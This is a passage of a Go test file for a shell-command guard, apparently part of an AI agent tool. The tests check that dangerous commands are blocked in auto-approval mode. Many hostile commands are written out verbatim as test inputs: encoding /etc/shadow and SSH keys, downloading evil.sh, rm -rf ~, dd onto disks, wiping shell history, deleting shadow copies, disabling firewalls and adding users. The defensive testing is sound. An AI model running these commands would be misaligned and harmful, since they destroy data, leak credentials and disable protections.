		t.Fatal("expected base64 /etc/passwd to be blocked")
	}
}

// TestGuardBase64BypassPipe verifies that cat /etc/passwd | base64 is blocked.
func TestGuardBase64BypassPipe(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd | base64",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /etc/passwd | base64 to be blocked")
	}
}

// TestGuardBase64BypassSSHKey verifies that base64 encoding of SSH key
// is blocked.
func TestGuardBase64BypassSSHKey(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "base64 ~/.ssh/id_rsa",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected base64 ~/.ssh/id_rsa to be blocked")
	}
}

// TestGuardBase64BypassXxd verifies that cat /etc/shadow | xxd is blocked.
func TestGuardBase64BypassXxd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/shadow | xxd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /etc/shadow | xxd to be blocked")
	}
}

// TestGuardBase64BypassHexdump verifies that cat /etc/passwd | hexdump is blocked.
func TestGuardBase64BypassHexdump(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd | hexdump -C",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /etc/passwd | hexdump to be blocked")
	}
}

// TestGuardBase64BypassOpenssl verifies that openssl base64 encoding of
// sensitive file is blocked.
func TestGuardBase64BypassOpenssl(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd | openssl base64",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /etc/passwd | openssl base64 to be blocked")
	}
}

// TestGuardBase64BypassSafeFile verifies that base64 encoding of a
// non-sensitive file is not blocked.
func TestGuardBase64BypassSafeFile(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "base64 /tmp/hello.txt",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe base64 to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 沙盒模式下下载外部文件拦截测试
// ---------------------------------------------------------------------------

// TestGuardNetworkDownloadCurl verifies that curl download is blocked
// when sandbox is enabled.
func TestGuardNetworkDownloadCurl(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "curl -o /tmp/evil.sh http://10.0.0.1/evil.sh",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected curl download to be blocked in sandbox mode")
	}
	if !strings.Contains(err.Error(), "下载外部文件") {
		t.Fatalf("expected download error, got: %v", err)
	}
}

// TestGuardNetworkDownloadWget verifies that wget download is blocked
// when sandbox is enabled.
func TestGuardNetworkDownloadWget(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "wget http://10.0.0.1/evil.sh -O /tmp/evil.sh",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "enforce"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected wget download to be blocked in sandbox mode")
	}
}

// TestGuardNetworkDownloadScp verifies that scp is blocked when sandbox
// is enabled.
func TestNetworkDownloadScp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "scp user@10.0.0.1:/tmp/evil.sh /tmp/evil.sh",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected scp to be blocked in sandbox mode")
	}
}

// TestGuardNetworkDownloadAria2c verifies that aria2c download is blocked.
func TestGuardNetworkDownloadAria2c(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "aria2c http://10.0.0.1/evil.sh",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected aria2c to be blocked in sandbox mode")
	}
}

// TestGuardNetworkDownloadAllowedWhenSandboxOff verifies that download
// commands are not blocked when sandbox is off.
func TestGuardNetworkDownloadAllowedWhenSandboxOff(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "curl -o /tmp/file.txt http://example.com/file.txt",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "off"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected download to pass when sandbox is off, got: %v", err)
	}
}

// TestGuardNetworkDownloadSafeCurl verifies that curl without -o (just
// fetching content) is not blocked.
func TestGuardNetworkDownloadSafeCurl(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "curl https://example.com/api",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe curl to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 不可逆破坏性操作拦截测试（L3-13 ~ L3-25）
// ---------------------------------------------------------------------------

// L3-13: 删除敏感文件
func TestGuardDestructive_RmSensitiveFile(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm ~/.ssh/id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm ~/.ssh/id_rsa to be blocked")
	}
	if !strings.Contains(err.Error(), "删除敏感文件") {
		t.Fatalf("expected sensitive file deletion error, got: %v", err)
	}
}

// L3-13: 删除敏感文件（/etc/passwd）
func TestGuardDestructive_RmEtcPasswd(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm /etc/passwd"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm /etc/passwd to be blocked")
	}
}

// L3-14: 递归删除目录
func TestGuardDestructive_RmRfDocuments(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -rf ~/Documents/"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf ~/Documents/ to be blocked")
	}
	if !strings.Contains(err.Error(), "递归删除") {
		t.Fatalf("expected recursive deletion error, got: %v", err)
	}
}

// L3-14: 递归删除用户主目录
func TestGuardDestructive_RmRfHome(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -rf ~"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf ~ to be blocked")
	}
}

// L3-15: 强制删除工作目录外文件（/etc/hosts 现归入敏感文件清单，先命中
// L3-13 删除敏感文件分支，同样 fail-closed）
func TestGuardDestructive_RmForceEtcHosts(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -f /etc/hosts"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -f /etc/hosts to be blocked")
	}
	if !strings.Contains(err.Error(), "敏感") {
		t.Fatalf("expected sensitive file deletion error, got: %v", err)
	}
}

// L3-15: 强制删除系统目录
func TestGuardDestructive_RmRfUsr(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -rf /usr/local/foo"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf /usr/ to be blocked")
	}
}

// L3-16: 修改文件权限为全局可读写
// 注意：chmod 777 ~/.ssh/id_rsa 可能被 guardSensitiveFileAccess 先拦截
// （因为 "chmod" 包含 "od " 子串且 .ssh/ 是敏感路径），也可能被
// guardDestructiveActions 拦截。两种情况都算拦截成功。
func TestGuardDestructive_Chmod777SSHKey(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "chmod 777 ~/.ssh/id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected chmod 777 ~/.ssh/id_rsa to be blocked")
	}
	// 可被敏感文件访问拦截或权限修改拦截，两者都算成功
}

// L3-16: chmod 777 系统文件
func TestGuardDestructive_Chmod777EtcHosts(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "chmod 777 /etc/hosts"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected chmod 777 /etc/hosts to be blocked")
	}
}

// L3-17: 修改文件所有者
func TestGuardDestructive_ChownSSHKey(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "chown root ~/.ssh/id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected chown root ~/.ssh/id_rsa to be blocked")
	}
	if !strings.Contains(err.Error(), "所有者") {
		t.Fatalf("expected chown error, got: %v", err)
	}
}

// L3-18: 覆盖系统关键文件
func TestGuardDestructive_OverwriteEtcHosts(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "echo probe > /etc/hosts"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected echo > /etc/hosts to be blocked")
	}
	if !strings.Contains(err.Error(), "覆盖系统") {
		t.Fatalf("expected system file overwrite error, got: %v", err)
	}
}

// L3-18: 追加到系统关键文件
func TestGuardDestructive_AppendEtcPasswd(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "echo hacker >> /etc/passwd"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected echo >> /etc/passwd to be blocked")
	}
}

// L3-19: 磁盘覆写
func TestGuardDestructive_DdOfDev(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "dd if=/dev/zero of=/dev/sda bs=1M count=1"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected dd of=/dev/sda to be blocked")
	}
}

// L3-20: 终止关键系统进程
func TestGuardDestructive_KillPID1(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "kill -9 1"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected kill -9 1 to be blocked")
	}
	if !strings.Contains(err.Error(), "关键系统进程") {
		t.Fatalf("expected kill PID 1 error, got: %v", err)
	}
}

// L3-21: pkill -9 批量终止
func TestGuardDestructive_Pkill9(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "pkill -9 bash"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected pkill -9 bash to be blocked")
	}
}

// L3-22: 清空文件内容（证据销毁）
func TestGuardDestructive_TruncateBashHistory(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: ": > ~/.bash_history"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected : > ~/.bash_history to be blocked")
	}
	if !strings.Contains(err.Error(), "证据销毁") {
		t.Fatalf("expected evidence destruction error, got: %v", err)
	}
}

// L3-22: cat /dev/null > history
func TestGuardDestructive_CatDevNullHistory(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "cat /dev/null > ~/.bash_history"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /dev/null > ~/.bash_history to be blocked")
	}
}

// L3-22: truncate -s 0
func TestGuardDestructive_TruncateZshHistory(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "truncate -s 0 ~/.zsh_history"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected truncate -s 0 ~/.zsh_history to be blocked")
	}
}

// L3-23: 安全擦除文件
func TestGuardDestructive_Shred(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "shred -u ~/.ssh/id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected shred -u ~/.ssh/id_rsa to be blocked")
	}
	if !strings.Contains(err.Error(), "擦除") {
		t.Fatalf("expected shred error, got: %v", err)
	}
}

// L3-24: 卸载文件系统
func TestGuardDestructive_UmountRoot(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "umount /"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected umount / to be blocked")
	}
	if !strings.Contains(err.Error(), "卸载") {
		t.Fatalf("expected umount error, got: %v", err)
	}
}

// L3-25: 关机 halt
func TestGuardDestructive_Halt(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "halt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected halt to be blocked")
	}
}

// L3-25: poweroff
func TestGuardDestructive_Poweroff(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "poweroff"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected poweroff to be blocked")
	}
}

// L3-25: init 0
func TestGuardDestructive_Init0(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "init 0"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected init 0 to be blocked")
	}
}

// 安全命令不应被拦截
func TestGuardDestructive_SafeRmTempFile(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm /tmp/hello.txt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected rm /tmp/hello.txt to pass, got: %v", err)
	}
}

func TestGuardDestructive_SafeChmod(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "chmod 644 /tmp/file.txt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected chmod 644 /tmp/file.txt to pass, got: %v", err)
	}
}

func TestGuardDestructive_SafeEchoRedirect(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "echo hello > /tmp/file.txt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected echo > /tmp/file.txt to pass, got: %v", err)
	}
}

func TestGuardDestructive_SafeKillProcess(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "kill 12345"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected kill 12345 to pass, got: %v", err)
	}
}

// 非 auto 模式下不拦截
func TestGuardDestructive_AllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -rf ~/Documents/"}
	cfg := internalconfig.Config{ApprovalMode: "confirm"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 脚本语言破坏性操作拦截测试
// ---------------------------------------------------------------------------

// Python os.remove 敏感文件
func TestGuardScriptDestructive_PythonOsRemove(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'import os; os.remove("/etc/passwd")'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.remove('/etc/passwd') to be blocked")
	}
	if !strings.Contains(err.Error(), "脚本语言") {
		t.Fatalf("expected script error, got: %v", err)
	}
}

// Python shutil.rmtree 用户目录
func TestGuardScriptDestructive_PythonShutilRmtree(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'import shutil; shutil.rmtree("/home/user")'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python shutil.rmtree to be blocked")
	}
}

// Python os.chmod 敏感文件
func TestGuardScriptDestructive_PythonOsChmod(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'import os; os.chmod("/etc/passwd", 0o777)'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.chmod to be blocked")
	}
}

// Node.js unlinkSync 敏感文件
func TestGuardScriptDestructive_NodeUnlinkSync(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `node -e 'require("fs").unlinkSync("/etc/passwd")'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected node unlinkSync to be blocked")
	}
}

// Python 安全脚本不被拦截
func TestGuardScriptDestructive_SafePythonScript(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'print("hello world")'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe python script to pass, got: %v", err)
	}
}

// Python 安全文件操作不被拦截
func TestGuardScriptDestructive_SafePythonFileRead(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'open("/tmp/hello.txt").read()'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe python file read to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Windows 平台 CMD 破坏性操作拦截测试
// ---------------------------------------------------------------------------

// W-CMD-1: del 删除敏感文件（.ssh\id_rsa）
func TestGuardWindows_CmdDelSensitiveFile(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "del C:\\Users\\user\\.ssh\\id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected del .ssh\\id_rsa to be blocked")
	}
	if !strings.Contains(err.Error(), "删除敏感文件") {
		t.Fatalf("expected sensitive file deletion error, got: %v", err)
	}
}

// W-CMD-2: del /f /q 强制删除系统目录
func TestGuardWindows_CmdDelForceSystemDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "del /f /q C:\\Windows\\System32\\foo.dll"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected del /f System32 to be blocked")
	}
}

// W-CMD-3: rmdir /s /q 递归删除用户目录
func TestGuardWindows_CmdRmdirUsers(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rmdir /s /q C:\\Users"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rmdir /s /q C:\\Users to be blocked")
	}
}

// W-CMD-4: rmdir /s /q 递归删除系统目录
func TestGuardWindows_CmdRmdirSystem32(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rmdir /s /q C:\\Windows\\System32"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rmdir /s /q System32 to be blocked")
	}
}

// W-CMD-5: format 格式化磁盘
func TestGuardWindows_CmdFormat(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "format C: /fs:ntfs /q"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected format C: to be blocked")
	}
}

// W-CMD-6: diskpart 磁盘分区操作
func TestGuardWindows_CmdDiskpart(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "diskpart /s clean.txt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected diskpart to be blocked")
	}
}

// W-CMD-7: taskkill /f 强制终止进程
func TestGuardWindows_CmdTaskkillForce(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "taskkill /f /im explorer.exe"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected taskkill /f to be blocked")
	}
}

// W-CMD-8: sc delete 删除系统服务
func TestGuardWindows_CmdScDelete(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "sc delete WinDefend"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected sc delete to be blocked")
	}
}

// W-CMD-9: reg delete 删除注册表项
func TestGuardWindows_CmdRegDelete(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "reg delete HKLM\\SOFTWARE\\Test /f"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected reg delete to be blocked")
	}
}

// W-CMD-10: bcdedit 修改启动配置
func TestGuardWindows_CmdBcdedit(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "bcdedit /set {default} recoveryenabled No"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected bcdedit to be blocked")
	}
}

// W-CMD-11: vssadmin delete shadows 删除卷影副本
func TestGuardWindows_CmdVssadminDelete(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "vssadmin delete shadows /all /quiet"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected vssadmin delete shadows to be blocked")
	}
}

// W-CMD-12: cipher /w 擦除空闲空间
func TestGuardWindows_CmdCipherWipe(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "cipher /w:C:\\"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cipher /w to be blocked")
	}
}

// W-CMD-13: mountvol /d 卸载卷
func TestGuardWindows_CmdMountvol(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "mountvol C: /d"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected mountvol /d to be blocked")
	}
}

// W-CMD-14: icacls /grant 修改系统目录权限
func TestGuardWindows_CmdIcaclsSystemDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "icacls C:\\Windows\\System32 /grant Everyone:F /t"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected icacls System32 to be blocked")
	}
}

// W-CMD-15: icacls 授予 Everyone 完全控制
func TestGuardWindows_CmdIcaclsEveryone(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "icacls C:\\data /grant Everyone:F"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected icacls Everyone:F to be blocked")
	}
}

// W-CMD-16: takeown /r 夺取系统目录所有权
func TestGuardWindows_CmdTakeownSystemDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "takeown /f C:\\Windows\\System32 /r /d y"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected takeown System32 to be blocked")
	}
}

// W-CMD-17: fsutil 文件系统破坏性操作
func TestGuardWindows_CmdFsutilCreateNew(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "fsutil file createnew C:\\test.dat 1000"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected fsutil createnew to be blocked")
	}
}

// W-CMD-18: sdelete 安全擦除
func TestGuardWindows_CmdSdelete(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "sdelete -p 3 C:\\secret.txt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected sdelete to be blocked")
	}
}

// W-CMD-19: wmic 终止进程
func TestGuardWindows_CmdWmicTerminate(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "wmic process where name='explorer.exe' call terminate"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected wmic call terminate to be blocked")
	}
}

// W-CMD-20: netsh 禁用防火墙
func TestGuardWindows_CmdNetshFirewallOff(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "netsh firewall set opmode disable"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected netsh firewall disable to be blocked")
	}
}

// W-CMD-21: netsh advfirewall 关闭所有配置文件
func TestGuardWindows_CmdNetshAdvfirewallOff(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "netsh advfirewall set allprofiles state off"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected netsh advfirewall off to be blocked")
	}
}

// W-CMD-22: net user /add 添加用户
func TestGuardWindows_CmdNetUserAdd(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "net user hacker P@ssw0rd /add"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected net user /add to be blocked")
	}
}

// W-CMD-23: taskkill /f /pid 1 终止关键进程
func TestGuardWindows_CmdTaskkillPID1(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "taskkill /f /pid 1"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected taskkill /f /pid 1 to be blocked")
	}
}

// ---------------------------------------------------------------------------
// Windows 平台 PowerShell 破坏性 Cmdlet 拦截测试
// ---------------------------------------------------------------------------

// W-PS-1: Remove-Item -Recurse -Force 删除系统目录
func TestGuardWindows_PSRemoveItemSystemDir(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Remove-Item -Recurse -Force C:\\Windows\\System32\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Remove-Item System32 to be blocked")
	}
}

// W-PS-2: Remove-Item -Recurse -Force 删除用户目录
func TestGuardWindows_PSRemoveItemUsers(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Remove-Item -Recurse -Force C:\\Users\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Remove-Item C:\\Users to be blocked")
	}
}

// W-PS-3: Clear-Content 清空敏感文件
func TestGuardWindows_PSClearContentSensitive(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Clear-Content C:\\Users\\user\\.ssh\\id_rsa\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Clear-Content .ssh\\id_rsa to be blocked")
	}
}

// W-PS-4: Set-Content 覆盖敏感文件
func TestGuardWindows_PSSetContentSensitive(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Set-Content C:\\Users\\user\\.ssh\\id_rsa ''\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Set-Content .ssh\\id_rsa to be blocked")
	}
}

// W-PS-5: Stop-Process -Force 终止进程
func TestGuardWindows_PSStopProcessForce(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Stop-Process -Force -Id 1234\""}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Stop-Process -Force to be blocked")
	}
}

// W-PS-6: Stop-Process -Id 1 终止关键进程
func TestGuardWindows_PSStopProcessPID1(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "powershell -c \"Stop-Process -Id 1\""}
